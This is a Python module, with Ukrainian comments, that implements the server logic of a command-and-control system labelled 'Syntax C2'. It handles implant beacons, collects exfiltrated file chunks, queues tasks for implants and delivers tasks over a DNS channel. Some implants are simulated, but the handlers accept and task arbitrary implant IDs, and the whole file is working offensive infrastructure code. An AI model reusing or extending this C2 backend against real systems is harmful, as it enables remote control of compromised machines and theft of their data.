# c2_control/logic.py
# Основна логіка для модуля C2 (Командування та Контроль)

import base64
import json
import random
import string
import time
import uuid
from datetime import datetime

# Імпорти з кореневих файлів проекту
import config # Доступ до VERSION_BACKEND

# Глобальні змінні для симуляції стану C2, тепер керовані цим модулем
simulated_implants_c2 = []
pending_tasks_for_implants_c2 = {}
exfiltrated_file_chunks_db_c2 = {}

def initialize_simulated_implants_c2_logic():
    """
    Ініціалізує або оновлює список симульованих імплантів та очищає пов'язані дані.
    Ця функція буде викликана при старті додатку з app_core.py.
    """
    global simulated_implants_c2, pending_tasks_for_implants_c2, exfiltrated_file_chunks_db_c2
    simulated_implants_c2.clear()
    pending_tasks_for_implants_c2.clear()
    exfiltrated_file_chunks_db_c2.clear()
    
    os_types = ["Windows_x64_10.0.22631", "Linux_x64_6.5.0", "Windows_Server_2022_Datacenter", "macOS_sonoma_14.1_arm64"]
    base_ip_prefixes = ["10.30.", "192.168.", "172.22."]
    num_implants = random.randint(4, 7)
    
    for i in range(num_implants):
        implant_id = f"SYNIMPLNT-ADV-{random.randint(10000,99999)}-{random.choice(string.ascii_uppercase)}"
        ip_prefix = random.choice(base_ip_prefixes)
        ip_address = f"{ip_prefix}{random.randint(10,250)}.{random.randint(10,250)}"
        os_type = random.choice(os_types)
        last_seen_timestamp = time.time() - random.randint(1, 60)
        last_seen_str = datetime.fromtimestamp(last_seen_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        
        simulated_implants_c2.append({
            "id": implant_id, "ip": ip_address, "os": os_type,
            "lastSeen": last_seen_str,
            "status": random.choice(["pending_beacon", "idle_monitoring", "task_in_progress", "active_beaconing"]),
            "files": [], "beacon_interval_sec": random.randint(30, 120)
        })
    simulated_implants_c2.sort(key=lambda x: x["id"])
    print(f"[C2_LOGIC_INIT] Ініціалізовано/Оновлено {len(simulated_implants_c2)} імітованих імплантів.")

# Викликаємо ініціалізацію один раз при завантаженні модуля
initialize_simulated_implants_c2_logic()


def handle_c2_beacon_logic(beacon_data: dict, log_messages: list) -> tuple[dict, int]:
    """Обробляє маячки від імплантів."""
    # ... (Повний код функції handle_c2_beacon з app.py v1.9.8) ...
    # Використовуйте simulated_implants_c2, pending_tasks_for_implants_c2, exfiltrated_file_chunks_db_c2
    global pending_tasks_for_implants_c2, simulated_implants_c2, exfiltrated_file_chunks_db_c2
    log_messages.append(f"[C2_LOGIC_BEACON] Обробка маячка о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")
    if not beacon_data:
        log_messages.append("[C2_LOGIC_BEACON_ERROR] Не отримано JSON даних маячка.")
        return {"success": False, "error": "No JSON beacon data", "log": "\n".join(log_messages)}, 400
    
    implant_id_from_beacon = beacon_data.get("implant_id")
    hostname_from_beacon = beacon_data.get("hostname", "N/A") # Отримуємо IP з самого запиту, якщо потрібно
    remote_addr_beacon = beacon_data.get("remote_addr", "N/A_from_beacon_data") # Якщо імплант передає свій IP
    
    log_messages.append(f"[C2_LOGIC_BEACON_RECEIVED] Отримано маячок від ID: {implant_id_from_beacon}, Hostname: {hostname_from_beacon}, Remote IP (reported): {remote_addr_beacon}")

    last_task_id_received = beacon_data.get("last_task_id")
    last_task_result_received = beacon_data.get("last_task_result")
    task_success_received = beacon_data.get("task_success")
    if last_task_id_received:
        log_messages.append(f"   Результат завдання '{last_task_id_received}' (Успіх: {task_success_received}): {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received or '')) > 200 else ''}")

    file_exfil_chunk_data = beacon_data.get("file_exfil_chunk")
    if file_exfil_chunk_data and last_task_id_received:
        file_path = file_exfil_chunk_data.get("file_path")
        chunk_num = file_exfil_chunk_data.get("chunk_num")
        total_chunks = file_exfil_chunk_data.get("total_chunks")
        data_b64 = file_exfil_chunk_data.get("data_b64")
        is_final_chunk = file_exfil_chunk_data.get("is_final", False)

        file_key = f"{implant_id_from_beacon}_{last_task_id_received}_{file_path}"
        if file_key not in exfiltrated_file_chunks_db_c2:
            exfiltrated_file_chunks_db_c2[file_key] = {"file_path": file_path, "task_id": last_task_id_received, "total_chunks": total_chunks, "received_chunks": {}, "implant_id": implant_id_from_beacon, "first_seen": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        
        if data_b64:
             exfiltrated_file_chunks_db_c2[file_key]["received_chunks"][chunk_num] = data_b64
             log_messages.append(f"   [EXFIL_CHUNK_LOGIC] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")

        if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db_c2[file_key]["received_chunks"]) == total_chunks):
            log_messages.append(f"   [EXFIL_COMPLETE_LOGIC] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
            if file_key in exfiltrated_file_chunks_db_c2: del exfiltrated_file_chunks_db_c2[file_key] 
    elif beacon_data.get("file_exfil_error"):
        log_messages.append(f"   [EXFIL_ERROR_REPORTED_LOGIC] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")

    implant_found_in_list = False
    for implant in simulated_implants_c2:
        if implant["id"] == implant_id_from_beacon:
            implant["lastSeen"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            implant["status"] = "active_beaconing"
            implant["ip"] = remote_addr_beacon if remote_addr_beacon != "N/A_from_beacon_data" else implant.get("ip", "N/A_updated") # Оновлюємо IP, якщо передано
            implant_found_in_list = True
            log_messages.append(f"[C2_LOGIC_BEACON_UPDATE] Оновлено lastSeen, статус та IP для імпланта {implant_id_from_beacon}.")
            break
    if not implant_found_in_list and implant_id_from_beacon: # Додаємо тільки якщо є ID
        log_messages.append(f"[C2_LOGIC_BEACON_WARN] Маячок від невідомого ID імпланта: {implant_id_from_beacon}. Додавання до списку.")
        new_implant_data = {
            "id": implant_id_from_beacon, 
            "ip": remote_addr_beacon if remote_addr_beacon != "N/A_from_beacon_data" else "N/A_new_implant", 
            "os": beacon_data.get("os_type", "Unknown from beacon"), 
            "lastSeen": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 
            "status": "active_beaconing_new", "files": [], 
            "beacon_interval_sec": beacon_data.get("beacon_interval_sec", 60)
        }
        simulated_implants_c2.append(new_implant_data)
        simulated_implants_c2.sort(key=lambda x: x["id"])

    next_task_to_assign = None
    if implant_id_from_beacon in pending_tasks_for_implants_c2 and pending_tasks_for_implants_c2[implant_id_from_beacon]:
        next_task_to_assign = pending_tasks_for_implants_c2[implant_id_from_beacon].pop(0)
        if not pending_tasks_for_implants_c2[implant_id_from_beacon]:
            del pending_tasks_for_implants_c2[implant_id_from_beacon]
        log_messages.append(f"[C2_LOGIC_TASK_ISSUED] Видано завдання '{next_task_to_assign.get('task_id')}' ({next_task_to_assign.get('task_type')}) для імпланта {implant_id_from_beacon}.")
    
    c2_response_to_implant = {"status": "OK", "next_task": next_task_to_assign, "message": "Beacon received by Syntax C2."}
    if next_task_to_assign: c2_response_to_implant["message"] += f" Task '{next_task_to_assign.get('task_id')}' issued."
    
    log_messages.append(f"[C2_LOGIC_BEACON_RESPONSE] Відповідь на маячок: {json.dumps(c2_response_to_implant)}")
    return {"success": True, "c2_response": c2_response_to_implant, "log": "\n".join(log_messages)}, 200


def handle_dns_resolver_sim_logic(request_args: dict, log_messages: list) -> tuple[dict, int]:
    """Симулює DNS-резолвер для DNS C2."""
    # ... (Повний код функції handle_dns_resolver_sim з app.py v1.9.8) ...
    global pending_tasks_for_implants_c2
    log_messages.append(f"[C2_LOGIC_DNS_SIM] Обробка DNS-симуляції о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")
    query_hostname = request_args.get('q')
    implant_id_from_dns_req = request_args.get('id')
    log_messages.append(f"[C2_LOGIC_DNS_SIM_RECEIVED] Отримано DNS-запит (симуляція): q='{query_hostname}', id='{implant_id_from_dns_req}'.")

    if not query_hostname or not implant_id_from_dns_req:
        log_messages.append("[C2_LOGIC_DNS_SIM_ERROR] Відсутній query або implant ID.")
        return {"success": False, "error": "Missing query or implant ID in DNS sim request", "log": "\n".join(log_messages)}, 400
    
    next_task_dns = None
    if implant_id_from_dns_req in pending_tasks_for_implants_c2 and pending_tasks_for_implants_c2[implant_id_from_dns_req]:
        next_task_dns = pending_tasks_for_implants_c2[implant_id_from_dns_req].pop(0)
        if not pending_tasks_for_implants_c2[implant_id_from_dns_req]:
            del pending_tasks_for_implants_c2[implant_id_from_dns_req]
        log_messages.append(f"[C2_LOGIC_DNS_SIM_TASK_FOUND] Знайдено завдання для {implant_id_from_dns_req}: {next_task_dns.get('task_id')}")
    
    response_payload = {"message": "DNS query processed by Syntax C2 Simulator."}
    if next_task_dns:
        task_json_str = json.dumps(next_task_dns)
        task_b64_str = base64.b64encode(task_json_str.encode('utf-8')).decode('utf-8') # Потрібен import base64
        response_payload["dns_txt_response_payload"] = task_b64_str
        response_payload["task_data"] = next_task_dns
        log_messages.append(f"[C2_LOGIC_DNS_SIM_RESPONSE_WITH_TASK] Відповідь з завданням (B64): {task_b64_str[:50]}...")
    else:
        log_messages.append("[C2_LOGIC_DNS_SIM_RESPONSE_NO_TASK] Відповідь без нового завдання.")

    return {"success": True, **response_payload, "log": "\n".join(log_messages)}, 200


def get_c2_implants_logic(log_messages: list) -> tuple[dict, int]:
    """Повертає список симульованих імплантів."""
    # ... (Повний код функції get_c2_implants з app.py v1.9.8) ...
    global simulated_implants_c2
    log_messages.append(f"[C2_LOGIC_GET_IMPLANTS] Запит списку імплантів о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")
    current_time = time.time()
    for implant in simulated_implants_c2:
        try:
            last_seen_dt = datetime.strptime(implant["lastSeen"], '%Y-%m-%d %H:%M:%S')
            if current_time - last_seen_dt.timestamp() > (implant.get("beacon_interval_sec", 60) * 5):
                implant["status"] = "offline_timeout"
        except ValueError:
             implant["status"] = "offline_unknown_lastseen"

    log_messages.append(f"[C2_LOGIC_GET_IMPLANTS_INFO] Повернення {len(simulated_implants_c2)} імітованих імплантів.")
    return {"success": True, "implants": simulated_implants_c2, "log": "\n".join(log_messages)}, 200


def handle_c2_task_logic(task_data: dict, log_messages: list) -> tuple[dict, int]:
    """Обробляє запит на постановку завдання імпланту."""
    # ... (Повний код функції handle_c2_task з app.py v1.9.8) ...
    global pending_tasks_for_implants_c2, simulated_implants_c2
    log_messages.append(f"[C2_LOGIC_TASK_HANDLER] Обробка завдання о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")
    if not task_data:
        log_messages.append("[C2_LOGIC_TASK_ERROR] Не отримано JSON даних завдання.")
        return {"success": False, "error": "No JSON task data", "log": "\n".join(log_messages)}, 400

    implant_id = task_data.get("implant_id")
    task_type = task_data.get("task_type")
    task_params = task_data.get("task_params", "")
    queue_task_flag = task_data.get("queue_task", True)

    log_messages.append(f"[C2_LOGIC_TASK_RECEIVED] Отримано завдання для ID: {implant_id}, Тип: {task_type}, Параметри: {str(task_params)[:100]}..., Черга: {queue_task_flag}")

    if not implant_id or not task_type:
        log_messages.append("[C2_LOGIC_TASK_ERROR] Відсутній ID імпланта або тип завдання.")
        return {"success": False, "error": "Missing implant_id or task_type", "log": "\n".join(log_messages)}, 400

    if not any(imp['id'] == implant_id for imp in simulated_implants_c2):
        log_messages.append(f"[C2_LOGIC_TASK_WARN] Спроба поставити завдання для невідомого імпланта ID: {implant_id}.")
        # Можна повернути помилку, або додати до черги, якщо імплант може з'явитися
        # return {"success": False, "error": f"Implant ID {implant_id} not found.", "log": "\n".join(log_messages)}, 404


    new_task_id = f"TASK-{uuid.uuid4().hex[:8].upper()}" # Потребує import uuid
    task_to_queue = {
        "task_id": new_task_id,
        "task_type": task_type,
        "task_params": task_params,
        "timestamp_created": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }

    if implant_id not in pending_tasks_for_implants_c2:
        pending_tasks_for_implants_c2[implant_id] = []
    
    pending_tasks_for_implants_c2[implant_id].append(task_to_queue)
    log_messages.append(f"[C2_LOGIC_TASK_QUEUED] Завдання {new_task_id} ({task_type}) додано до черги для імпланта {implant_id}.")
    
    for implant_entry in simulated_implants_c2:
        if implant_entry["id"] == implant_id:
            implant_entry["status"] = "task_pending"
            break
    
    return {
        "success": True, 
        "message": f"Task {new_task_id} ({task_type}) queued for implant {implant_id}.",
        "queued_task": task_to_queue,
        "log": "\n".join(log_messages)
    }, 200

def get_simulated_implants() -> list:
    """Повертає поточний список симульованих імплантів."""
    global simulated_implants_c2
    return simulated_implants_c2

def get_exfiltrated_file_chunks() -> dict:
    """Повертає поточну базу даних частин файлів, що ексфільтруються."""
    global exfiltrated_file_chunks_db_c2
    return exfiltrated_file_chunks_db_c2
